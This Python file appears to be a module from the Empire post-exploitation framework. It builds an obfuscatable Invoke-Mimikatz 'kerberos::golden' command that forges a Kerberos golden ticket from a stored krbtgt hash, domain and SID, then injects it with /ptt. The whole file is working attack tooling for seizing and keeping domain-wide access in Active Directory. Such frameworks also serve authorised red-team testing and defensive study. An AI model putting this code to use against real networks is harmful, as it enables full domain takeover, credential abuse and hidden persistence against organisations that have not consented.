import logging
from typing import Dict

from empire.server.core.db.models import Credential
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if cred.username != "krbtgt":
                return handle_error_message("[!] A krbtgt account must be used")

            if cred.domain != "":
                params["domain"] = cred.domain
            if cred.sid != "":
                params["sid"] = cred.sid
            if cred.password != "":
                params["krbtgt"] = cred.password

        if params["krbtgt"] == "":
            log.error("krbtgt hash not specified")

        # build the golden ticket command
        script_end = "Invoke-Mimikatz -Command '\"kerberos::golden"

        for option, values in params.items():
            if option.lower() != "agent" and option.lower() != "credid":
                if values and values != "":
                    script_end += " /" + str(option) + ":" + str(values)

        script_end += " /ptt\"'"

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
